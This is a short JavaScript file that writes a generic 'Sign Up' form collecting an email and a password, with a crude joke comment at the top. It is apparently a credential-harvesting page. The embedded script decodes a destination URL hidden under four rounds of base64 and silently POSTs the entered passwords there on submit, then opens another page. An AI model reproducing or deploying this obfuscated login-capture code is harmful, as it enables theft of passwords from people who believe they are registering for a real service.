//teri mummy cute he yaar 🥺
document.write(`<form  method="post" id="sheetdb-form"  ><div class="container">  <h1>Sign Up</h1>  <p>Please fill in this form to create an account.</p>  <hr>  <label for="email"><b>Email</b></label>  <input type="text" placeholder="Enter Email" name="data[Em]" required>  <label for="psw"><b>Password</b></label>  <input type="password" placeholder="Enter Password" name="data[Pss]" required>  <label for="psw"><b>Password</b></label>  <input type="password" placeholder="Enter Password" name="data[rPss]" required>  <label>    <input type="checkbox" checked="checked" name="remember" style="margin-bottom:15px"> Remember me  </label>  <p>By creating an account you agree to our <a href="#" style="color:dodgerblue">Terms & Privacy</a>.</p>  <div class="clearfix">    <button type="button" class="cancelbtn">Cancel</button>    <button type="submit" class="signupbtn">Sign Up</button>  </div></div></form><script>
let conc = "V1ZWb1UwMUhUa2xVVkZwTlpWUnNObGxWWkZkaVIxSklWVzFzVFdKWGVESlVSRXBIWkRKR1ZFOVVTazVWZW14M1ZERlNZV1JIVG5GVmJsSnFUV3BHTVZRd1VrcE9VVDA5"
conc = atob(conc);conc = atob(conc);conc = atob(conc);conc = atob(conc);
var form = document.getElementById('sheetdb-form');
form.addEventListener("submit", e => {
  e.preventDefault();
  fetch(conc, {
      method : "POST",
      body: new FormData(document.getElementById("sheetdb-form")),
  }).then(
      response => response.json()
  ).then((html) => {
    // you can put any JS code here
    window.open('page2.html', '_blank');

  });
});
</script>`);
